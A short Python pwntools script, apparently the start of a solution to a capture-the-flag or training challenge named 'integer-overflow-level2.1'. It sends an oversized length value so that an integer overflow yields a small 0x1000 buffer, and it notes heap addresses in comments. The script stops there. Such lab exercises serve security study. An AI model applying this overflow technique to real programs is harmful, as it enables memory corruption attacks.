#!/usr/bin/env python

import pwn

# proc = pwn.process("/challenge/integer-overflow-level2.1")
proc = pwn.process("./integer-overflow-level2.1")

proc.sendline(b'1') # create
proc.sendline(b'1073742336') # 0x40000200 溢出，实际大小为0x1000
proc.clean()
# 0x4052a0  p_buffer=0x4052c0
# 0x4052a8  size=0x40000200

# 0x4052c0  buffer


